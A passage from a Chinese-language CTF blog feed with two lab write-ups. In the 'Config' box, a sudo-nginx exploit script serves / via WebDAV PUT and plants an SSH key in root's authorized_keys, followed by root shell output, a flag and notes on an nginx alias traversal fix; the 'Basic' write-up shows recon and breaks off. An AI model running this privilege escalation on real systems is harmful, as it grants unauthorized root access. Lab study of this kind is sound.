id="Nginx权限提升"><a href="#Nginx权限提升" class="headerlink" title="Nginx权限提升"></a>Nginx权限提升</h2><p>找到利用脚本<br><a href="https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406">https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Creating configuration...&quot;</span><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/nginx_pwn.conf</span><br><span class="hljs-string">user root;</span><br><span class="hljs-string">worker_processes 4;</span><br><span class="hljs-string">pid /tmp/nginx.pid;</span><br><span class="hljs-string">events &#123;</span><br><span class="hljs-string">        worker_connections 768;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">http &#123;</span><br><span class="hljs-string">server &#123;</span><br><span class="hljs-string">        listen 1339;</span><br><span class="hljs-string">        root /;</span><br><span class="hljs-string">        autoindex on;</span><br><span class="hljs-string">        dav_methods PUT;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Loading configuration...&quot;</span><br><span class="hljs-built_in">sudo</span> nginx -c /tmp/nginx_pwn.conf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Generating SSH Key...&quot;</span><br>ssh-keygen<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Display SSH Private Key for copy...&quot;</span><br><span class="hljs-built_in">cat</span> .ssh/id_rsa<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Add key to root user...&quot;</span><br>curl -X PUT localhost:1339/root/.ssh/authorized_keys -d <span class="hljs-string">&quot;<span class="hljs-subst">$(cat .ssh/id_rsa.pub)</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Use the SSH key to get access&quot;</span><br></code></pre></td></tr></table></figure><p>生成ssh私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ <span class="hljs-built_in">sudo</span> /usr/sbin/nginx -c /home/mikannse/mikannse.conf<br>mikannse@Config:~$ ssh-keygen -t rsa<br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/mikannse/.ssh/id_rsa): <br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/mikannse/.ssh/id_rsa<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/mikannse/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:i5kh2t8iim3icLeD8r7DEM2ZKMJ59R4B0Jgxn1eg/a8 mikannse@Config<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|   +*.....       |</span><br><span class="hljs-string">|   ooo+..        |</span><br><span class="hljs-string">|.+.o.+.o.        |</span><br><span class="hljs-string">|=o=.  .o.        |</span><br><span class="hljs-string">|o.. . o S.       |</span><br><span class="hljs-string">|.  o . * ..      |</span><br><span class="hljs-string">|.oo.o + .  .     |</span><br><span class="hljs-string">|++=.oo..  .      |</span><br><span class="hljs-string">|oB*+.o...E       |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ <span class="hljs-built_in">cat</span> .ssh/id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoRzarhS5Xj9KwSMsRRjOPx84NnNL0EoChAMSwTSnmkns8d5FdA33qJr2Ouac9GnG0BIjFOfn/jxrSPiRl8g5tIBUFyODHFKL/lQ6iZLETIp5NgnAakX+jllHLycvC6uUEkF8RM02sNEZYWTzASpK4yOlU14ky3Jf0nGpMTAU/pHxfLKjcZAvKO35e/rpqewjRZb7qXFcOL5rPLEwCiTXCQ6HOhRH28cmUnDbo68wX1rbqbTNNEIOOj/rmaE4RLzKkBsUgB+wiDnY4oVPOo3gCTdLB1cm+2ivXyWfhaM+AO/lLjuhMrckoHG2hVxkOZkHDo4zlcMtlvI+MkUnOI7tfiHVQxPbVboQ59wrSQ7BbFs6qgKziSatVXEccR4fnou+s8QbojN13Km0H1JjpFWZMwfCj7ZQ1HjFr3QciAzsSbDJMkGHfER5eEAR2u2PzAWEd0yuIr7hKElxaJoXYDhp6BuW/snEr9HVP9hkr10IC7lGKeRzX0JclBX+NEavLbj0= mikannse@Config<br></code></pre></td></tr></table></figure><p>将私钥上传到root用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# curl http://192.168.2.49:1339/root/.ssh/authorized_keys -X PUT -d <span class="hljs-string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoRzarhS5Xj9KwSMsRRjOPx84NnNL0EoChAMSwTSnmkns8d5FdA33qJr2Ouac9GnG0BIjFOfn/jxrSPiRl8g5tIBUFyODHFKL/lQ6iZLETIp5NgnAakX+jllHLycvC6uUEkF8RM02sNEZYWTzASpK4yOlU14ky3Jf0nGpMTAU/pHxfLKjcZAvKO35e/rpqewjRZb7qXFcOL5rPLEwCiTXCQ6HOhRH28cmUnDbo68wX1rbqbTNNEIOOj/rmaE4RLzKkBsUgB+wiDnY4oVPOo3gCTdLB1cm+2ivXyWfhaM+AO/lLjuhMrckoHG2hVxkOZkHDo4zlcMtlvI+MkUnOI7tfiHVQxPbVboQ59wrSQ7BbFs6qgKziSatVXEccR4fnou+s8QbojN13Km0H1JjpFWZMwfCj7ZQ1HjFr3QciAzsSbDJMkGHfER5eEAR2u2PzAWEd0yuIr7hKElxaJoXYDhp6BuW/snEr9HVP9hkr10IC7lGKeRzX0JclBX+NEavLbj0= mikannse@Config&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="六、获取ROOT权限"><a href="#六、获取ROOT权限" class="headerlink" title="六、获取ROOT权限"></a>六、获取ROOT权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ ssh root@localhost<br>Linux Config 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat Jul  5 00:48:20 2025 from 192.168.3.94<br>root@Config:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Config:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-bf116e68-5953-11f0-b06c-63e27ce93d04&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h1 id="1、Nginx配置错误"><a href="#1、Nginx配置错误" class="headerlink" title="1、Nginx配置错误"></a>1、Nginx配置错误</h1><p>如果静态文件存储在 <code>/home/</code> 目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名。Nginx在配置别名(Alias)的时候，如果忘记加 <code>/</code> ，将造成一个目录穿越漏洞。</p><ul><li>产生原因：由于 location 中目标路径未闭合导致相对路径穿越<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /files &#123;<br>    <span class="hljs-attribute">alias</span> /home/ ;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>目录穿越后，是 Alias 目标目录的上一层，<strong>并且只能穿越一层目录</strong>。</p><p>修复：闭合 location 路径即可</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /files/ &#123;<br>      <span class="hljs-attribute">alias</span> /home/ ;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2、Nginx提权-sudo"><a href="#2、Nginx提权-sudo" class="headerlink" title="2、Nginx提权&#x2F;sudo"></a>2、Nginx提权&#x2F;sudo</h1><p><a href="https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406">https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406</a><br>条件-您必须具有以下 sudo 权限<code>nginx</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">用户@主机：〜 $ sudo -l匹配主机上用户的<br>默认条目：<br>    env_reset，mail_badpass，secure_path = / usr / local / sbin \： / usr / local / bin \： / usr / sbin \： / usr / bin \： / sbin \： / bin \： / snap / bin，use_pty<br><br>用户可以在主机上运行以下命令：<br>    （全部：全部）NOPASSWD：/usr/sbin/nginx<br></code></pre></td></tr></table></figure><p>从现有的交互会话创建以下漏洞代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo  “ [+] 创建配置... ” <br>cat &lt;&lt;  EOF &gt; /tmp/nginx_pwn.conf <br>user root; <br>worker_processes 4; <br>pid /tmp/nginx.pid; <br>events &#123; <br>        worker_connections 768; <br>&#125; <br>http &#123; <br>server &#123; <br>        listen 1339; <br>        root /; <br>        autoindex on; <br>        dav_methods PUT; <br>&#125; <br>&#125; <br>EOF<br> echo  “ [+] 加载配置... ”<br>sudo nginx -c /tmp/nginx_pwn.conf<br>echo  “ [+] 生成 SSH 密钥... ”<br>ssh-keygen<br>echo  “ [+] 显示 SSH 私钥以供复制…… ”<br>猫.ssh/id_rsa<br>echo  “ [+] 将密钥添加到 root 用户... ” <br>curl -X PUT localhost:1339/root/.ssh/authorized_keys -d “ $( cat .ssh/id_rsa.pub ) ”<br> echo  “ [+] 使用 SSH 密钥获取访问权限”<br></code></pre></td></tr></table></figure><p>然后运行漏洞利用程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./exploit.sh<br></code></pre></td></tr></table></figure><p>存储 SSH 私钥然后使用它连接到主机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 根密钥<br>ssh -i root_key root@host<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nginx配置错误</tag>
      
      <tag>nginx提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic</title>
    <link href="/Maze-sec/Basic/"/>
    <url>/Maze-sec/Basic/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap -sn 192.168.2.0/24                                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0012s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0020s latency).<br>MAC Address: 08:00:27:F5:57:69 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0010s latency).<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.22 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.48</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap --min-rate 10000 -p- 192.168.2.48                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.00033s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.69 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22，80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.48 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:03 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: HTTP Requester<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.77 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap -sU --top-ports 100 192.168.2.48                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:04 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0020s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 111.76 seconds<br></code></pre></td></tr></table></figure><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问<code>80</code>端口，发现是一个<code>Website Request Tool</code>工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# curl http://192.168.2.48<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;HTTP Requester&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: 800px;<br>            margin: 0 auto;<br>            padding: 20px;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>        &#125;<br>        .container &#123;<br>            background-color: white;<br>            padding: 20px;<br>            border-radius: 8px;<br>            box-shadow: 0 2px 10px rgba(0,0,0,0.1);<br>        &#125;<br>        h1 &#123;<br>            color: <span class="hljs-comment">#333;</span><br>            border-bottom: 2px solid <span class="hljs-comment">#eee;</span><br>            padding-bottom: 10px;<br>        &#125;<br>        form &#123;<br>            margin: 20px 0;<br>            display: flex;<br>            gap: 10px;<br>        &#125;<br>        input[<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span>] &#123;<br>            flex: 1;<br>            padding: 10px;<br>            border: 1px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: 4px;<br>        &#125;<br>        button &#123;<br>            padding: 10px 20px;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: white;<br>            border: none;<br>            border-radius: 4px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#45a049;</span><br>        &#125;<br>        .result-box &#123;<br>            margin-top: 20px;<br>            padding: 15px;<br>            background-color: <span class="hljs-comment">#f9f9f9;</span><br>            border-left: 4px solid <span class="hljs-comment">#ccc;</span><br>        &#125;<br>        nav &#123;<br>            margin-top: 30px;<br>            display: flex;<br>            gap: 15px;<br>        &#125;<br>        nav a &#123;<br>            padding: 8px 16px;<br>            background-color: <span class="hljs-comment">#e0e0e0;</span><br>            border-radius: 4px;<br>            text-decoration: none;<br>            color: <span class="hljs-comment">#333;</span><br>        &#125;<br>        nav a:hover &#123;<br>            background-color: <span class="hljs-comment">#d0d0d0;</span><br>        &#125;<br>        pre &#123;<br>            max-height: 300px;<br>            overflow: auto;<br>            padding: 15px;<br>            background-color: <span class="hljs-comment">#f8f8f8;</span><br>            border: 1px solid <span class="hljs-comment">#e0e0e0;</span><br>            border-radius: 4px;<br>            white-space: pre-wrap;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>        &lt;h1&gt;Website Request Tool&lt;/h1&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>            &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;url&quot;</span> placeholder=<span class="hljs-string">&quot;Enter URL starting with http&quot;</span> required&gt;<br>            &lt;button <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;Fetch Content&lt;/button&gt;<br>        &lt;/form&gt;<br>        <br>        &lt;div class=<span class="hljs-string">&quot;result-box&quot;</span>&gt;<br>            &lt;h3&gt;Current target:&lt;/h3&gt;<br>            No request made        &lt;/div&gt;<br>        <br>        &lt;div class=<span class="hljs-string">&quot;result-box&quot;</span>&gt;<br>            &lt;h3&gt;Response:&lt;/h3&gt;<br>                            &lt;p&gt;Submit URL to <span class="hljs-built_in">test</span> connection&lt;/p&gt;<br>                    &lt;/div&gt;<br>        <br>        &lt;nav&gt;<br>            &lt;a href=<span class="hljs-string">&quot;home.php&quot;</span>&gt;Home&lt;/a&gt;<br>            &lt;a href=<span class="hljs-string">&quot;about.php&quot;</span>&gt;About&lt;/a&gt;<br>            &lt;a href=<span class="hljs-string">&quot;dashboard.php&quot;</span>&gt;Dashboard&lt;/a&gt;<br>        &lt;/nav&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.48<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,bak,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/about.php            (Status: 200) [Size: 334]<br>/home.php             (Status: 200) [Size: 334]<br>/index.php            (Status: 200) [Size: 2675]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; home.php]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>没有发现有用目录</p><h2 id="2、request-其他服务"><a href="#2、request-其他服务" class="headerlink" title="2、request 其他服务"></a>2、request 其他服务</h2><p>kali上开一个服务，尝试让靶机请求，发现可以进行请求<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507091439720.png"></p><h2 id="3、Token泄露"><a href="#3、Token泄露" class="headerlink" title="3、Token泄露"></a>3、Token泄露</h2><p>kali上开启监听，让靶机进行访问，发现返回了<code>Authorization: Basic</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 